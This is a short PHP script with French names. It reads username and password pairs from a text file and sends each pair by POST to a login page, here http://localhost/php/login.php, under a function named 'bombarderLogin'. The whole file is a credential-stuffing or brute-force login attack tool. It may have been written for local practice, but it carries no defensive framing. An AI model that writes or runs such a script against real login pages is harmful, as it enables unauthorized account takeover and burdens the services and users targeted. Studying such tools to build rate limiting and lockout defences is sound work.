<?php
function lireFichierTexte($filePath) {
    $lines = file($filePath, FILE_IGNORE_NEW_LINES);
    $data = array();

    foreach ($lines as $line) {
        list($nomUtilisateur, $motdepasse) = explode(',', $line);
        $data[] = array('nomUtilisateur' => $nomUtilisateur, 'motdepasse' => $motdepasse);
    }

    return $data;
}

function bombarderLogin($url) {
    $filePath = 'test.txt';
    $utilisateurs = lireFichierTexte($filePath);

    foreach ($utilisateurs as $utilisateur) {
        $username = $utilisateur['nomUtilisateur'];
        $password = $utilisateur['motdepasse'];

        // Exécuter la requête POST avec curl
        $postData = "username=" . urlencode($username) . "&password=" . urlencode($password);
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_VERBOSE, true);
        $response = curl_exec($curl);
        curl_close($curl);
        
}
}

// Appel de la fonction pour bombarder la page de connexion
bombarderLogin('http://localhost/php/login.php');

?>

